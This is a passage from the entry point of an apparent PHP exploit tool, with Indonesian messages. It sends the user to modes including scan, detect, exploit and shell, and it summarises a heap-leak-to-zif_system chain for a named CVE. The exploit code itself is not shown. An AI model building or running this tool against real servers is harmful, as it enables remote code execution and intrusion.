            f"{cve} tidak diimplementasikan tool ini; pilihan sah: "
            f"{', '.join(CVE_SUPPORTED)}\n"
            f"  Kenapa: rantai tool ini (heap-leak → libphp-base → zif_system "
            f"via\n"
            f"  pDestructor) menargetkan CVE-2026-109619 (stale global state, "
            f"2 request).\n"
            f"  109618 (OOM corruption, konsumen=shutdown, 1 request) punya "
            f"rantai beda dan\n"
            f"  tidak disalin ke sini. Bukti crash 109618: verifikator asli "
            f"ikow/php2shell-poc\n"
            f"  (poc/verify_oom_trigger.py) — lihat LAPORAN_UJI_DOCKER."
        )

    _banner(args, mode=args.mode)

    # --check-version / mode `version`: tanya GitHub sekali, jangan pernah
    # menggagalkan jalan utama kalau offline (gagal-aman by design).
    if getattr(args, "check_version", False):
        vc = version_mod.check(VERSION, use_cache=True)
        print(f"  {version_mod.format_line(vc)}")
        if vc.update_available:
            print(f"  -> update: git -C {ROOT} pull --ff-only   ({vc.url})")
        print()

    try:
        if args.mode == "scan":
            return cmd_scan(args)
        if args.mode == "detect":
            if not args.urls and not args.list:
                ap.error("detect butuh -u URL atau -l file.txt")
            return cmd_detect(args)
        if args.mode == "preflight":
            return cmd_preflight(args)
        if args.mode == "exploit":
            return cmd_exploit(args)
        if args.mode == "shell":
            return cmd_shell(args)
        if args.mode == "version":
            return cmd_version(args)
        if args.mode == "builds":
            return cmd_builds(args)
    except FileNotFoundError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        print("\ndihentikan pengguna", file=sys.stderr)
        return 130
    ap.error(f"mode tidak dikenal: {args.mode}")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
